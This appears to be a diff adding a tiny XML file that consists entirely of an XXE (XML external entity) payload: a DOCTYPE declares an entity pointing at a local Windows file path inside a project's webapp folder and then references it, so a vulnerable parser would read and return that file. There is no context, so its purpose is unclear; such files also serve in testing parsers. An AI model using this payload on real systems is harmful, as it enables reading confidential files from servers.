@@ -1,0 +1,4 @@
+<!DOCTYPE a[
+	<!ENTITY xxe SYSTEM "file:///D:/workspace/EclipseEvr/payment/src/main/webapp/MP_verify_6pmjU5vXU29h4Juz.txt">
+]>
+ &xxe;
